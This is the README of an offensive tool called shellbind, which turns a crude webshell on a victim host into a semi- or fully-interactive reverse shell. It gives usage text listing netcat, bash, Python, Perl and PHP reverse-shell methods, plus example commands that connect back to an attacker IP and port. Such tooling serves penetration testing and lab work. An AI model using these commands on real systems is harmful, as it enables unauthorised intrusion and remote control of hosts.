# shellbind

Shellbind is a python script that allows to bind a semi- or fully-interactive shell to an existing crude webshell.

### Installation:

```bash
usage: shellbind.py [-h] -p PARAMETER NAME [-X METHOD] -u HOST [-v] [-r METHOD:LHOST:PORT]

Shellbind is a programm that helps to upgrade a simple GET/POST webshell into a semi- or fully-interactive (reverse) shell.

options:
  -h, --help            show this help message and exit
  -p PARAMETER NAME, --parameter PARAMETER NAME
                        The parameter the is used to run shell commands
  -X METHOD, --method METHOD
                        The method (GET/POST) that that is used (Default: GET)
  -u HOST, --host HOST  The host that is attacked.
                        Example: http://www.victim.com/vuln.php
  -v, --verbose         Verbose Output
  -r METHOD:LHOST:PORT, --reverse METHOD:LHOST:PORT
                        If set the programm upgrades the connection from a webshell to a fully-interactive reverse shell.
                        Available methods are:
                          auto - Try until a reverse shell binds
                          php - php reverseshell
                          py - python3 reverse shell with sockets
                          py2 - python2 reverse shell with sockets
                          nc1 - netcat reverse shell with -e flag
                          nc2 - netcat reverse shell with -c flag
                          bash - sh -i reverse shell
                          perl - perl reverse shell
                        LHOST should be the ip that the victim can connect to
                        The port can be any unused port

Examples:
-Semi interactive shell (no cd, su, etc.)
	shellbind.py -X POST -p cmd -u http://vuln.example/shell.php
-Fully interactive shell with verbose output
	shellbind.py -p cmd -u http://vuln.example/shell.py -v -r auto:10.10.13.37:8080
```
### Help
If the fully interactive reverse shell is somehow buggy try the `reset` command it should fix the issue.
